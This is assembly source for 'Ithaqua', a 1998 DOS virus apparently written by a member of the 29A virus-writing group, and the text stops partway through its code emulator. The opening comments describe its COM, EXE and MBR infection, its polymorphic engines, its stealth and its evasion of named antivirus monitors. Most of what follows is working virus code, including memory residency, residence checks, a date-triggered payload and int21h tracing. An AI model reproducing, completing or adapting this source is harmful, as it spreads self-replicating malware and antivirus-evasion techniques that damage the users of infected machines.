   ;                            .   .       .  .    .
   ;                           .:: .:.. .. .:.::. :.:.
   ;                       <<-=ÜÛÛÛÛÛÜ.ÜÛÛÛÛÛÜ.ÜÛÛÛÛÛÜ==<
   ;                         .:ÛÛÛ ÛÛÛ:ÛÛÛ ÛÛÛ.ÛÛÛ ÛÛÛ::.
   ;                        :: .ÜÜÜÛÛß.ßÛÛÛÛÛÛ:ÛÛÛÛÛÛÛ .:.
   ;                       .:..ÛÛÛÜÜÜÜ.ÜÜÜÜÛÛÛ.ÛÛÛ ÛÛÛ.::.:
   ;                     .:>===ÛÛÛÛÛÛÛ:ÛÛÛÛÛÛß.ÛÛÛ ÛÛÛ==->> .
   ;                   ..: ::. . .:..Laboratories .:.. :.. ::..
   ;
   ;
   ;      Replicant name.............Ithaqua
   ;      Brain engineer.............Wintermute/29A
   ;      Model......................Advanced Nexus-6 Final Beta
   ;      Corporal type..............Unknown
   ;      Size.......................8543 celular units
   ;      Date of Birth..............28/9/1998
   ;      Date of Termination........Reserved
   ;
   ;
   ;                    Ithaqua replicant significative data
   ;                     ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;
   ;   Intruding technologies
   ;    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   For entering into enemy or hostile systems, Ithaqua  has  an  unique
   ; feature; code emulating. This allows the owner to make a great variety
   ; of things, such as tracing the int21h to it's original  handler.  Many
   ; tests have been made with this,  evading  biocode  killers  and  other
   ; hostile  or  neutral  programs;  Virstop  ( F-prot ),  Vsafe,  Vshield
   ; ( McAfee ), TbDriver ( Tbav ),  Sentinel  ( Panda )...  Smartdrv,  and
   ; nearly any program that dares to handle int21h.
   ;
   ;   The code emulator is an advanced engine  about  2'7  Kb  long  which
   ; dissasembles and executes under control each instruction it  finds  on
   ; it's way to  int21h,  but  evading  at  the  same  time  antidebugging
   ; techniques and tricks. Some of the instructions are just  executed  at
   ; the "execution zone" in  the  code  with  special  security  measures,
   ; others are even more controlled by just emulating their efects (  this
   ; is so explained in the Arise Code Emulator article in this magazine )
   ;
   ;   When entering a system, first  of  all  the  engine  will  find  the
   ; original handler of int21h, aborting operation  if  not  found.  After
   ; that, it will handle with a far jmp  ( EAh XX XX XX XX )  one  of  the
   ; three first instructions on the int21h handler. This jump, of  course,
   ; is controlled by the replicant itself in order to let  other  programs
   ; access to int21h when needed and mantain it's own supremacy;  when  an
   ; int21h is called, the jump goes to the virus  code.  After  int21h  is
   ; restored and checks are  made,  it  traces  five  instructions  before
   ; recovering the jump, then replaces it.
   ;
   ;   Also, this jump is often changed  to  make  difficult  removing  the
   ; virus from memory. Each time int8h ( timer interrupt, non anulated  by
   ; a cli ) is made, it changes the jump among that 3 positions. Fixes are
   ; made for handling when special/weird conditions occur ( such as Dos in
   ; UMBs )
   ;
   ;
   ;   Autoreplicating technologies
   ;    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   Ithaqua infects COM Appending/Inserting,  EXE cavity/appending,  and
   ; MBR on hard disks.
   ;
   ;   For COM infection, if there's EMS available and the file is  smaller
   ; than 32Kb, Ithaqua will load it and search a random 3-byte instruction
   ; among the first 255 ones to place the jump to it's code by using  it's
   ; code emulator, making the inserting infection same  as  stable  as  an
   ; appending one could be. Otherwise ( if there's no EMS or the  file  is
   ; bigger than 32kb ) it will infect by the old appending technique.
   ;
   ;   The EXE cavity infection isn't anything of special  interest  except
   ; it's cavity ;P. It will search for the same opcode ( no  matter  which
   ; one ) in the EXE file and if it's successful it will copy itself there
   ; and change the CS:IP in header. Just bored of making always  the  same
   ; infection method, not anything to really worth about.
   ;
   ;   File infection in EXE cavity and COM appending is polymorphic due to
   ; "RNME" ( Reconstructed Necromantic Mutation Engine ).  In the  basics,
   ; this is the engine I used in Zohra virus; maybe using tables as in the
   ; GROG engine ( the MBR poly in this virus ) I would save space, but who
   ; cares, then it won't be the RNME :-P. I reduced the decrypting  groups
   ; instructions and added some options, instructions and other  stuff  to
   ; make it even more polymorphic, as well as subroutine calls... (  well,
   ; AVP detected only 4% of the samples when the weekly update  for  Zohra
   ; was out, so there's something that worked  good  on  this  engine  and
   ; better if so strenghten up <g> ).
   ;
   ;   EXE appending infection is only made in two cases, where none of the
   ; others are performed. That is, when Windows95 is running,  or  in  the
   ; rare case that the code emulator failed. To prevent crashing  it  also
   ; uses an alternative int21h handler; it uses some of the routines  from
   ; the other infection code, but it's not compatible with them,  as  they
   ; use SFTs, etc, which don't exist in Win95. It's just that it's  better
   ; non-condemning Ithaqua to death when on Win95 as this operating system
   ; is probably the most... hum... "widespread" now.
   ;
   ;   MBR is done esentially to prevent user from booting out of the  hard
   ; disk with one of those clean diskettes; so this infection doesn't load
   ; the whole virus. It just waits for the real virus,  which  then  takes
   ; control of the int13h and kills the MBR module.  I  feel  more  secure
   ; getting int21h with my code emulator than with any other method :)
   ;
   ;   The MBR infection is polymorphic, due to my  "Gory  Ruthless  Opcode
   ; Generator", which is a new about 600  bytes  long  boot-oriented  poly
   ; engine, creating two encryption layers. The original MBR is  encrypted
   ; and stored in sector two; maybe the most interesting thing about  this
   ; poly  engine  is  that  it's  so  compact,  as  new  instructions   or
   ; instruction groups can be easily  added  to  make  a  new  polymorphic
   ; engine; also has some stack tricks that can only be  done  in  a  boot
   ; oriented engine.
   ;
   ;   The MBR infection check method is so simple; I was going to do  some
   ; CRC on it and save the byte in the end  before  the  55AAh,  but  it's
   ; easier just to call int13h; if the resident MBR stuff is there it will
   ; answer us, if not, it's not there :). When it's off, the virus will be
   ; in memory; if you disinstall it it will fuck up the MBR when trying to
   ; infect, but hey, it was your phucking fault :P
   ;
   ;
   ;   Self-concealing technology
   ;    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   Ithaqua has the typical FCB/DTA stealth, plus  Windows  95  stealth,
   ; which is performed on 714eh and 714fh functions from int21h ( that is,
   ; for example, which Dos 7.0 use ).
   ;
   ;   The two polymorphic engines and encryption were described above.
   ;
   ;
   ;   Payload
   ;    ÄÄÄÄÄÄÄÙ
   ;
   ;   This time the payload is a video effect which is a  snow  effect  on
   ; some text about the virus name; it is activated  each  29th  of  April
   ; when the user executes the virus, and "halts the computer" :-P
   ;
   ;
   ;
   ;   Final comments
   ;    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   Yep, guys. This has reached  the  end.  I've  been  a  lot  of  time
   ; thinking about this painful decission, but I have no  chance  at  all.
   ; University is consuming all my spare time, and,  let's  face  it,  I'm
   ; getting a bit tired on this, as I'm all day working and I  just  can't
   ; continue as I was; this virus was a lot of months I'm afraid to count,
   ; and it shouldn't have wasted that amount of time on this one.
   ;
   ;   So, I'm leaving 29A, and I don't know if I'll leave virus writing; I
   ; can't continue writing more and more viruses and articles.
   ;
   ;   Anyway, I'll be around :), and by  this  moment  I'll  remain  as  a
   ; collaborator for 29A so if I have the  time  for  writing  stuff  I'll
   ; publish it here :).
   ;
   ;   And coming to the end,... 29A isn't only a bunch of people that send
   ; their viruses among them and publish 'em later; I've made friends  and
   ; known many people by this group, and by all my time as a virus writer.
   ; So, I dedicate this little child to all of them: to the 29A  Crew,  to
   ; all people that helped me to grow, and to the people I've  known  this
   ; fantastic years on virus writing. A great hug to all of ya, and see ya
   ; on IRC... :)
   ;
   ;
   ;
   ;   Assembly notes
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   Tasm ithaqua.asm /m2
   ;   Tlink ithaqua.obj
   ;
   ;
   ;
   ;      ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;       Las grandes tristezas son as¡; se clavan tan hondo en el coraz¢n
   ;            que parecen perdidas y el mismo coraz¢n no las siente,
   ;                             con asombro nuestro.
   ;
   ;       Pero dura poco el enga¤o; est n bien clavadas para toda la vida.
   ;      Primero es llanto, quejas, rabia quiz ; despu‚s, es la resignaci¢n,
   ;                  una sonrisa, una sonrisa triste y dolorosa,
   ;                        como una herida abierta siempre.
   ;                           ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                             ( Jacinto Benavente )
   ;


   .model tiny
   .386
   .code
   org 00h


   virus_starts label byte

   Virus:

           push    ds
           pop     es
           pushf
           push    bp ax bx cx dx es ds si di              ; insertion

           mov     bp,0000h                                ; delta
   BP_Init         equ     $-2
           mov     si,bp
           sub     si,((offset virus) - (offset we_r_there))
           push    si

           call    temp                ; Future crypt
   Fut_Crypt       equ     $-2

           ret

   encryption_starts label byte
   encryption_length equ encryption_ends-encryption_starts

   payload:

   ;        0                                             320
   ;        ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;        ³                                               ³
   ;        ³                                               ³
   ;        ³                                               ³
   ;        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;        0+320*199                             320+320*199
   ;

           Start:

           in      al,40h
           mov     ah,al
           xor     word ptr cs:[random],ax

           mov     ax,0013h        ; Mode 13h
           int     10h

           push    0a000h          ; Begins in 0a000h
           pop     ds
           push    ds
           pop     es

           xor     di,di           ; Blank screen ( all = 0 )
           mov     cx,64000d
           xor     ax,ax
           rep     stosb

           mov     di,(320d*198d)  ; Final line
           mov     cx,640d
           mov     al,042d
           rep     stosb

           push    ds
           push    cs
           pop     ds
           mov     dx,0f03h        ; Write text
           mov     bx,5d
           mov     ah,2
           int     10h
           lea     si,VName
   @write:
           lodsb
           or      al,al
           je      @dabaduba
           mov     ah,0eh
           int     10h
           jmp     @write
   @dabaduba:
           pop     ds
   @dabadaba:
           call    Create_Row      ; A new snowy row

           call    Move_Row        ; Moves a row one pixel below, checks all

           call    Retrace

           jmp     @dabadaba


   Create_Row:
           mov     cx,8d
   Randomize:
           call    Get_Random_NB
           mov     bx,320d
           xor     dx,dx
           div     bx                      ; Rest = AH
           mov     bx,dx

           mov     byte ptr ds:[bx],15d
           loop    Randomize

           ret

   Get_Random_NB:
           mov     ax,word ptr cs:[random] ; Get Random
           not     ah
           neg     al
           xor     ax,0dcbah
   Change_R equ $-2
           rol     ax,3d
           sub     word ptr cs:[Change_R],ax
           add     ax,word ptr cs:[Change_R]
           not     word ptr cs:[Change_R]
           add     ah,byte ptr cs:[random]
           sub     al,byte ptr cs:[random+1]
           xor     ax,word ptr cs:[Change_R]
           push    ds
           xor     bx,bx
           mov     ds,ax
           mov     bx,word ptr ds:[413h]
           pop     ds
           sub     word ptr cs:[Change_R],bx
           push    ax
           in      al,40h
           mov     dl,al
           pop     ax
           add     al,dl
           mov     word ptr cs:[random],ax
           ret

   Move_Row:
           mov     si,64000d-320d
   Check_Row:
           lodsb                       ; Backwards so it does not fuck up
           dec     si
           dec     si
           cmp     al,15d
           jz      @Not_Blank
           cmp     si,64000d;-320d
           jbe     Check_Row
           ret
   @Not_Blank:
           cmp     byte ptr [si+321d],0
           mov     byte ptr [si+1],0
           jnz     Check_Side
           cmp     byte ptr [si+321d+320d],0
           jnz     @Just_Do_IT
           call    get_random_NB
           and     ax,01d
           jz      @Just_Do_IT
           call    get_random_NB
           xor     bp,bp
           cmp     byte ptr [si+321d+321d],0d      ; down 2, right +1
           jnz     @no_2abajoder
           inc     bp
   @no_2abajoder:
           cmp     byte ptr [si+321d+319d],0d
           jnz     @@then_2abajo
           dec     bp
           jnz     @@then_izquierda2abajo
           and     ax,1
           jz      @@@2_derecha
   @@then_izquierda2abajo:
           mov     byte ptr [si+321d+319d],15d
           jmp     Check_Row
   @@then_2abajo:
           dec     bp
           jnz     @then_2abajo
   @@@2_derecha:
           mov     byte ptr [si+321d+321d],15d
           jmp     Check_Row
   @then_2abajo:
           mov     byte ptr [si+321d+320d],15d
           jmp     Check_Row
   @Just_Do_IT:
           mov     byte ptr [si+321d],15d
           jmp     Check_Row
   Check_Side:

           xor     bp,bp
           cmp     byte ptr [si+322d],0
           jnz     @Check_Left
           inc     bp
   @Check_Left:
           cmp     byte ptr [si+320d],0
           jnz     @If_Right
           dec     bp
           jz      @Select_Side
           jmp     @If_Left
   @Select_Side:
           call    Get_Random_NB
           and     al,1d
           jz      @Right_Yeah
   @If_Left:
           mov     byte ptr [si+320d],15d
           jmp     Check_Row
   @If_Right:
           dec     bp
           jz      @Right_Yeah
           mov     byte ptr [si+1],15d
           jmp     Check_Row

   @Right_Yeah:
           mov     byte ptr [si+322d],15d
           jmp     Check_Row



   Retrace:

           mov     dx,3dah         ; Delay till retrace
   del1:   in      al,dx
           test    al,8
           jne     del1
   del2:   in      al,dx
           test    al,8
           je      del2
           ret


   random: dw      1234h


   ;       Here it starts the code after the payload.

   we_r_there:

           mov     cl,11110000b
           push    es ds cs

           xor     ax,ax           ; Computer processor below 80286 ?
           push    ax
           popf
           pushf
           pop     ax
           and     ah,cl
           sub     ah,cl
           sub     cl,10000000b
           jz      @go_2_end

           push    7000h           ; 386+ required, don't hang 80286s
           popf
           pushf
           pop     ax
           and     ah,cl
           jnz     @@no_go_2_end
   @go_2_end:
           jmp     finished_tsr
   @@no_go_2_end:
           mov     esi,"_29A"          ; The virus makes two residence checks.
           mov     ax,0CACAh           ; If it's installed in memory by means
           int     21h                 ;of the int21h check, it will do nothing.
           cmp     esi,"RULZ"
           jz      @go_2_end

           sub     ah,05bh
           push    ax

           push    cs
           pop     dx
           mov     ax,offset @PollaGrandePaTuBoca
           add     ax,bp
           push    ax
           pop     cx
           mov     eax,"_POT"
           mov     word ptr cs:[_ss+bp],ss
           mov     word ptr cs:[_sp+bp],sp
           int     13h                 ; But if int21h isn't installed, maybe
                                       ;we've gotta check int13h.

   @PollaGrandePaTuBoca:

           mov     ss,word ptr cs:[_ss+bp]
           mov     sp,word ptr cs:[_sp+bp]
           mov     byte ptr cs:[are_we_on_MBR+bp],0
           cmp     eax,"ALSO"
           pop     cx
           jnz     @Not_in_MBR
           inc     byte ptr cs:[are_we_on_MBR+bp]
   @Not_in_MBR:
           mov     ax,0c001h
           adc     ax,03c57h
           jnc     @Not_in_MBR+1
           int     21h                     ; ax = 3508h

                                       ; Maybe we weren't

           mov     ah,52h
           mov     word ptr cs:[int8h+bp],bx
           mov     word ptr cs:[int8h+2+bp],es
           int     21h                     ; ah = 52h
           mov     al,'Z'
           mov     si,es:[bx-2]
           mov     ds,si

   search_mcb:
           xor     al,byte ptr ds:[0]
           jz      gotda_mcb
           add     si,word ptr ds:[3]
           inc     si
           xor     al,byte ptr ds:[0]
           mov     ds,si
           jmp     search_mcb

   gotda_mcb:
           mov     ax,word ptr ds:[3]
           cmp     ax,(virus_16b*2)+24h
           jbe     finished_tsr
   @@@FIXTHIS:
           add     si,ax
           sub     si,(virus_16b*2)+23h
           mov     es,si

           xor     si,si
           xor     di,di
           mov     cx,16d
           rep     movsb

           sub     word ptr ds:[3],(virus_16b*2)+24h
           sub     word ptr ds:[12h],(virus_16b*2)+24h
           mov     word ptr es:[3],(virus_16b*2)+24h
           mov     byte ptr ds:[0],'M'

           mov     ax,es
           inc     ax
           mov     word ptr es:[1],ax      ;
           mov     es,ax
           xor     di,di
           mov     si,bp
           mov     cx,virus_size
           push    cs
           pop     ds
           rep     movsb                   ; To mem

           push    es
           push    offset Exec_mem
           retf
   Exec_mem:
           push    bp
           xor     bp,bp

           mov     ah,02ah
           int     21h
           cmp     dx,041dh        ; 29th of April
           jz      Payload

           mov     ax,5d06h
           int     21h
           mov     word ptr cs:[Swap_seg],ds
           mov     word ptr cs:[Swap_off],si

   ;--------------

           xor     ax,ax
           push    ax
           call    fuck_the_rules
           pop     ds
           mov     eax,dword ptr ds:[0084h]        ; Int21h setting
           mov     dword ptr cs:[_ip],eax

           mov     word ptr cs:[_ds],cs
           mov     word ptr cs:[_es],cs
           mov     word ptr cs:[_ax],03000h
           mov     word ptr cs:[_usemode],0000h

           call    check_dos_version               ; Check if Win95 present
           jae     Adapt_W95

           call    Code_Emulator
           jc      Adapt_W95
           mov     dword ptr cs:[int21h],eax
           mov     dword ptr cs:[int21h_plural],eax
           mov     dword ptr cs:[jump_handle],eax
           mov     si,ax
           rol     eax,16d
           mov     ds,ax

           push    cs
           pop     es
           lea     di,saved21
           movsd
           movsb

           mov     byte ptr cs:[_HowMuch],5d   ; How much to trace

           mov     cx,2                ; Second&Third instructions on int21h

   @@emulate_it_again_Sam:

           push    cx cx                       ;is there, the jump changing
           call    set_a_pair_values
           pop     bx
           shl     bx,2
           mov     dword ptr cs:[int21h_plural+bx],eax
           pop     cx
           dec     byte ptr cs:[_theresacall]
           jz      @@@Ifweloop
           mov     byte ptr cs:[_HowMuch],35d
   @@@Ifweloop:
           loop    @@emulate_it_again_Sam

           call    set_a_pair_values
           dec     byte ptr cs:[_theresacall]
           jz      @I_do_rule
           mov     byte ptr cs:[_HowMuch],35d
   @I_do_rule:

           push    cs
           pop     ds
           mov     ax,2508h        ; Handle int 08h
           lea     dx,handler22h
           int     21h
           cli
           call    rehandle
           sti
           jmp     Anyway_Inst

   Adapt_W95:
           push    cs              ; W95 and int08h handling isn't cool :-D
           xor     ax,ax           ;well, and Sfts, and... O:)
           mov     ds,ax
           mov     eax,dword ptr ds:[0084h]
           pop     ds
           mov     dword ptr ds:[int21h],eax
           mov     dword ptr ds:[jump_handle],eax
           mov     word ptr ds:[int21h_plural],0

   Adapt_W95_2:
           mov     ax,2521h
           lea     dx,Alternate_21_handler     ; Need alternative one
           int     21h

   Anyway_Inst:

           pop     bx      ; Delta offset
           pop     es                  ; CS: on original host if not TSR
           push    es                  ;
           dec     byte ptr cs:[are_we_on_MBR]
           jz      @TheHardMenPath

           call    check_dos_version
           jae     @TheHardMenPath
           call    MBR_Infection
   @TheHardMenPath:
           xor     bp,bp

   finished_tsr:

           xor     ax,ax
           xor     bx,bx
           pop     ds
           xlat
           pop     ds es
           add     al,033h             ; Com file ?
           jz      com_normal


           mov     si,ds
           add     si,cs:word ptr [buffercom+0eh+bp]
           add     si,10h              ; Stack
           cli
           mov     ss,si
           mov     sp,cs:word ptr [buffercom+010h+bp]
           sti


           mov     si,ds                   ; And now we jump pushing
           add     si,cs:word ptr [cs_ip+bp+2] ; and with a retf to the
           add     si,10h                  ; old beggining of the host
           push    si
           push    cs:word ptr [cs_ip+bp]



           call    restore_originals

           retf


   com_normal:

           push    cs
           pop     ds
           push    ss
           pop     es
           lea     si,[buffercom+bp]
           mov     di,word ptr ds:[ret_pos+bp]
           push    es di
           movsw
           movsb

           cli
           add     sp,4d
           pop     di si ds es dx cx bx ax bp
           popf
           sub     sp,24d
           sti

           retf    14h             ; Final SP adjust


   restore_originals:

           xor     ax,ax           ; Zero registers
           mov     bx,ax
           mov     cx,ax
           cwd
           mov     si,ax
           ret


   ;-ú--ú-ú--ú-ú--úú-úú-ú--ú-úú-ú--ú-ú--ú-ú--ú-úú-ú--ú--úú-ú-úú-úú-ú--úú-ú--ú-
   ;                            CODE EMULATOR
   ;-ú--ú-ú--ú-ú--úú-úú-ú--ú-úú-ú--ú-ú--ú-ú--ú-úú-ú--ú--úú-ú-úú-úú-ú--úú-ú-úú-
   ;
   ;  The detail. The minimal thing. Explore. Discover. Understand. Ignore. Cry.
   ; Save yourself.
   ;

   Code_Emulator:

           xor     cx,cx

   get&exec_instruction:

           mov     byte ptr cs:[_pref],0   ; Segment Prefix Off
           push    cs                      ; Clean execution zone
           pop     es
           mov     al,90h
           lea     di,(execi-1)
           push    cx
           mov     cx,7
           rep     stosb
           pop     cx

   @get&exec_part2:

           add     word ptr cs:[_ip],cx     ; Put the IP

           mov     al,byte ptr cs:[_usemode]; Two operating modes
           or      al,al
           jnz     @non_tracing_int
           cmp     word ptr cs:[_cs],300h   ; If segment <= 300h, we've got the
           jae     Seguiremos_adelante      ;int handler
   ended:
           mov     eax,dword ptr cs:[_ip]  ; Carry off => All was fine
           clc
           ret

   @infecting_inserting:

           mov     al,byte ptr cs:[_usemode+1]
           cmp     al,1
           jnz     @@@tempo
           cmp     cx,3
           jnb     @@@temp
           inc     byte ptr cs:[_usemode+1]
   @@@temp:    jmp @@@tempo

   @non_tracing_int:

           dec     al
           jnz     @infecting_inserting
   @@@tempo:
           dec     byte ptr cs:[_usemode+1]    ; One instruction less
           jz      ended

   Seguiremos_adelante:

           xor     ax,ax
           mov     ds,word ptr cs:[_cs]
           mov     si,word ptr cs:[_ip]
           push    ds si
           lodsb                       ; Loads instruction on ds:si

           push    cs
           pop     ds
           lea     si,offset_table

   @denuevo1:

           cmp     al,40h          ; First opcode group
           jnb     @mayorde40
           and     al,00001111b
           add     al,50h
           jmp     @@mayorde40

   @mayorde40:
           cmp     al,60h          ; All 40h-5fh are executables and 1 byte long
           jnb     @@mayorde40
           pop     si ds
           xor     cx,cx
           jmp     @bytes1

   @@mayorde40:
           sub     al,50h          ; Correct table.

           add     si,ax           ; Offset is a word, so we'll have to add two
           add     si,ax           ;times the offset to jump to the right one:
                                   ;once done, we just jump.

           xor     cx,cx
           lodsw

           pop     si ds
           jmp     ax

   ;-ú--ú-ú--ú-ú-ú--ú-ú-ú--úú-ú-úú-ú-ú--ú-ú-ú-úú-ú--ú--úú-úúú-ú-ú-ú-ú--ú-ú-ú--
   ;     Specific routines for non directly-executable instructions
   ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-ú--ú-ú--ú-ú--úú-ú-úúú-ú-úú-ú--ú-úú-ú-ú-ú

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; Fixed instructions size
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @bytes6:    inc     cx
   @bytes5:    inc     cx
   @bytes4:    inc     cx
   @bytes3:    inc     cx
   @bytes2:    inc     cx
   @bytes1:    inc     cx
   @Ya_sumado_cx_var:

           push    cs
           pop     es
           lea     di,execi
           push    cx
           rep     movsb
           pop     cx
           jmp     ejecuci¢n

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú-
               ; 0FEh Opcode
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-ú

   @0FEh:  lodsb                   ; It's interesting to see that so FEh has
           cmp     al,10h          ;many instructions with "byte ptr", some of
           jb      @Variable1      ;them ( 50% ) are incorrect; only INC/DEC
           cmp     al,40h          ;work
           jb      @wrongkind
           cmp     al,50h
           jb      @Variable1
           cmp     al,80h
           jb      @wrongkind
           cmp     al,90h
           jb      @Variable1
           cmp     al,0c0h
           jb      @wrongkind
           cmp     al,0d0h
           jb      @Variable1
           jmp     @wrongkind

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; Invalid 8086 instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @wrongkind:             ; Invalid opcode

           stc
           ret         ; Return without getting place



               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; Non-fixed instructions
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @Variable3: inc     cx              ; Non-fixed length instructions
   @Variable2: inc     cx
   @Variable1: inc     cx

           inc     cx
           push    si
           lodsw
           cmp     ah,40h
           jnb     @fixedsup
           and     ah,00001111b
           cmp     ah,06h
           jz      @es6oevar
           cmp     ah,0eh
           jnz     @trapix_optimizado2
   @es6oevar:
           inc     cx
   @Trapix_optimizado:
           inc     cx
   @Trapix_optimizado2:
           pop     si
           jmp     @Ya_sumado_cx_var
   @fixedsup:
           cmp     ah,80h
           jb      @trapix_optimizado
           cmp     ah,0c0h
           jb      @es6oevar
           jmp     @Trapix_optimizado2


               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú-ú--ú-úú-ú-
               ; Direct stack pushes and instruction prefixes
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú--ú-ú--ú-ú-ú

   @pushstack:
           lodsb
           dec     si
                       ; All Push or pops can be emulated by normal execution.
                       ;Only we've gotta emulate PUSH CS, cause we cannot
                       ;emulate that opcode.
           cmp     al,0eh
           jz      @PushCsKind
           cmp     al,20h          ;If it's a push
           jb      @bytes1

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; Segment prefixes ( CS included )
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-
   @Prefix:

           mov     byte ptr cs:[_pref],al ; Segment prefix on
           push    ax
           lodsb
           inc     al
           pop     ax
           jz      @@OuttaPrefix
   @@SigPrefix:
           cmp     al,2eh
           jnz     @@NotCsPrefix       ; Prefix isn't CS: ( this one has some
                                       ;special treatment )
           push    word ptr cs:[_ds]
           pop     word ptr cs:[_ds2]
           push    word ptr cs:[_cs]
           pop     word ptr cs:[_ds]
           mov     byte ptr cs:[_csflag],1
           mov     al,3eh              ; We make DS as Prefix and move CS to DS
                                       ;so we activate flag on _csflag. It will
                                       ;be checked and then got from _ds2,
                                       ;restoring at the end of the routine
                                       ;execution.

   @@NotCsPrefix:
                           ; 26h (ES:), 36h (SS:), 3eh (DS:)
                           ; Repz/Repnz are also emulated here

           mov     byte ptr cs:[execi-1],al

   @@OuttaPrefix:

           inc     cx
           jmp     @get&exec_part2


               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; PUSH CS instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @PushCsKind:        ; Push CS: We obtain ss:sp, decrease one word, it's on ES:
                       ; DI and the value is stored in that ss:sp, emulating.

           mov     ax,word ptr cs:[_cs]
           mov     es,word ptr cs:[_ss]
           sub     word ptr cs:[_sp],2
           mov     di,word ptr cs:[_sp]
           stosw

           inc     cx
           jmp     get&exec_instruction

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; Instruction: RET [number]
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @RetNum:                ; The RET [num] order is exactly the same as Ret,
                           ;although it adds SP the number stored in [num]

           call    @Ret_subroutine_1

   @Subr_Add_Opcode:

           inc     si
           lodsw
           add     word ptr cs:[_sp],ax        ; A¤adimos ese n£mero.
   @@Ret_Return:
           jmp     get&exec_instruction

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; Ret instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @RetKind:

           push    offset @@Ret_Return

   @Ret_subroutine_1:

           mov     es,word ptr cs:[_ss]
           mov     di,word ptr cs:[_sp]
           push    word ptr es:[di]
           add     word ptr cs:[_sp],2
           pop     word ptr cs:[_ip]
           ret

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; RETF instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-


   @RetfKind:

           push    offset @@Ret_Return

   @Ret_subroutine_2:

           mov     es,word ptr cs:[_ss]
           mov     di,word ptr cs:[_sp]
           push    word ptr es:[di+2]
           push    word ptr es:[di]
           add     word ptr cs:[_sp],4
           pop     word ptr cs:[_ip]
           pop     word ptr cs:[_cs]
           ret

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; RETF [num] instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-


   @RetfNum:

           call    @Ret_subroutine_2
           jmp     @Subr_Add_Opcode

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; Interrupt calls
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @Interrupt:     ; It's an interrupt call: it won't be executed, but the
                   ;emulator will return a CLC, as if nothing bad happened
                   ;with it O:)

           inc     cx
           inc     cx
           mov     byte ptr cs:[execi],0f8h
           jmp     ejecuci¢n

   @Iretkind:      ; *-*

           call    @Ret_subroutine_2
           add     word ptr cs:[_sp],2
           mov     ax,word ptr es:[di+4]
           mov     word ptr cs:[_flags],ax
           jmp     get&exec_instruction

   @getflags:
           push    word ptr cs:[_flags]
           popf
           ret

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; LOOPZ instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-
   @Mloopz:
           dec     word ptr cs:[_cx]           ; LOOPZ will make Loop if zero
           push    word ptr cs:[_flags]        ;flag is on, and Decs Cx
           popf
           jnz     @@FinalLoop
           jmp     @Njmp

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; LOOP & LOOPNZ instructions
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-
   @Mloop:
           dec     word ptr cs:[_cx]
           jz      @@FinalLoop
           jmp     @Njmp
   @@FinalLoop:
           inc     cx
           inc     cx
           jmp     get&exec_instruction

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; short CALL instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

